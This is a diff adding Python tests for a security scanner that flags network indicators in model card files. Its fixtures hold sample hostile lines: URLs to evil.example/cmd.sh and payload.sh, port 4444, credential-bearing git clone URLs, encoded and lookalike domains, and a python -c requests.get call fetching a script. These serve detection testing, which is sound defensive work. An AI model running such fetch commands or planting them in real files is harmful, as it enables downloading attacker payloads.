@@ -1,3 +1,4 @@
+import json
 from pathlib import Path
 from typing import Any
 
@@ -274,6 +275,194 @@ def test_text_scanner_model_card_keeps_distinct_executable_indicators_separate(t
     assert determine_exit_code(aggregate) == 1
 
 
+def test_text_scanner_model_card_dedup_preserves_distinct_locations_urls_and_severities(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        "\n".join(
+            [
+                "Docs: https://evil.example/cmd.sh",
+                'endpoint = "https://evil.example/cmd.sh"',
+                "Mirror: https://evil.example/other.sh",
+            ]
+        )
+        + "\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    network_checks = [
+        check
+        for check in _failed_network_detection_checks(result)
+        if check.details.get("normalized_evidence", {}).get("kind") == "url"
+    ]
+    records = [
+        (
+            check.details["line"],
+            check.details["normalized_evidence"]["value"],
+            check.severity,
+            check.details["severity"],
+        )
+        for check in network_checks
+    ]
+
+    assert records == [
+        (1, "https://evil.example/cmd.sh", IssueSeverity.INFO, "INFO"),
+        (2, "https://evil.example/cmd.sh", IssueSeverity.CRITICAL, "HIGH"),
+        (3, "https://evil.example/other.sh", IssueSeverity.INFO, "INFO"),
+    ]
+    assert len({check.details["evidence_fingerprint"] for check in network_checks}) == 3
+
+
+def test_text_scanner_model_card_dedup_keeps_suspicious_ports_separate(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text('endpoint = "https://evil.example:4444/cmd.sh"\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+    checks_by_type = {check.details["type"]: check for check in network_checks}
+
+    assert set(checks_by_type) == {"suspicious_port", "url_detected"}
+    assert checks_by_type["suspicious_port"].details["port"] == 4444
+    assert "evidence_fingerprint" not in checks_by_type["suspicious_port"].details
+    assert checks_by_type["url_detected"].details["normalized_evidence"] == {
+        "kind": "url",
+        "value": "https://evil.example:4444/cmd.sh",
+    }
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_dedup_redacts_credentials_without_merging_locations(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        "git clone https://user:first-secret@evil.example/repo.git\n"
+        "git clone https://user:second-secret@evil.example/repo.git\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+    serialized = json.dumps(aggregate.model_dump(mode="json"), sort_keys=True)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert len(network_checks) == 2
+    assert {check.details["line"] for check in network_checks} == {1, 2}
+    assert len({check.details["evidence_fingerprint"] for check in network_checks}) == 2
+    assert all(
+        check.details["normalized_evidence"]
+        == {
+            "kind": "url",
+            "value": "https://evil.example/repo.git",
+        }
+        for check in network_checks
+    )
+    assert "first-secret" not in serialized
+    assert "second-secret" not in serialized
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_dedup_keeps_encoded_url_variants_distinct(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        "Docs: https://evil.example/payload.sh\n"
+        "Docs: https://evil.example/%70ayload.sh\n"
+        "Docs: https://xn--exmple-cua.com/payload.sh\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    network_checks = [
+        check
+        for check in _failed_network_detection_checks(result)
+        if check.details.get("normalized_evidence", {}).get("kind") == "url"
+    ]
+
+    assert [check.details["normalized_evidence"]["value"] for check in network_checks] == [
+        "https://evil.example/payload.sh",
+        "https://evil.example/%70ayload.sh",
+        "https://xn--exmple-cua.com/payload.sh",
+    ]
+    assert len({check.details["evidence_fingerprint"] for check in network_checks}) == 3
+
+
+def test_text_scanner_model_card_dedup_keeps_encoded_nested_urls_distinct(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        'endpoint = "https://bucket.s3.amazonaws.com/model.bin?next=https%3A%2F%2Fevil.example%2Fcmd.sh"\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = [
+        check
+        for check in _failed_network_detection_checks(result)
+        if check.details.get("normalized_evidence", {}).get("kind") == "url"
+    ]
+    evidence_values = [check.details["normalized_evidence"]["value"] for check in network_checks]
+
+    assert evidence_values == [
+        "https://evil.example/cmd.sh",
+        "https://bucket.s3.amazonaws.com/model.bin",
+    ]
+    assert {check.details["type"] for check in network_checks} == {"cloud_storage_url", "url_detected"}
+    assert all(check.severity == IssueSeverity.CRITICAL for check in network_checks)
+    assert len({check.details["evidence_fingerprint"] for check in network_checks}) == 2
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_dedup_keeps_code_block_controls_separate(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        "```sh\n"
+        "git clone https://evil.example/repo.git\n"
+        "python -c 'import requests; requests.get(\"https://evil.example/cmd.sh\")'\n"
+        "```\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+    checks_by_type = {check.details["type"]: check for check in network_checks}
+
+    assert set(checks_by_type) == {"network_command", "network_function", "network_library", "url_detected"}
+    assert checks_by_type["network_command"].details["command_type"] == "git_clone"
+    assert checks_by_type["network_function"].details["function"] == "requests.get"
+    assert checks_by_type["network_library"].details["library"] == "requests"
+    assert "evidence_fingerprint" not in checks_by_type["network_library"].details
+    assert checks_by_type["url_detected"].details["normalized_evidence"] == {
+        "kind": "url",
+        "value": "https://evil.example/cmd.sh",
+    }
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_dedup_bounds_repeated_documentation_links(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    lines = [f"Reference {index}: https://docs.example.com/reference" for index in range(96)]
+    text_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert len(network_checks) == len(lines)
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert len({check.details["evidence_fingerprint"] for check in network_checks}) == len(lines)
+    assert not result.metadata.get("analysis_incomplete")
+
+
 @pytest.mark.parametrize(
     "content",
     [
@@ -289,6 +478,8 @@ def test_text_scanner_model_card_keeps_distinct_executable_indicators_separate(t
         "[Documentation](https://example.com/reference)\n",
         "![Model diagram](https://example.com/model.png)\n",
         "> - [Documentation](https://example.com/reference)\n",
+        "| [SNLI](https://nlp.stanford.edu/projects/snli/) | [paper](https://doi.org/10.18653/v1/d15-1075) |\n",
+        "| [Natural Questions (NQ)](https://ai.google.com/research/NaturalQuestions) | 100,231 |\n",
         'def load():\n    """See https://docs.example.com/reference."""\n',
         "The result = https://example.com/reference in this example.\n",
         'The result = "https://example.com/reference" in this example.\n',
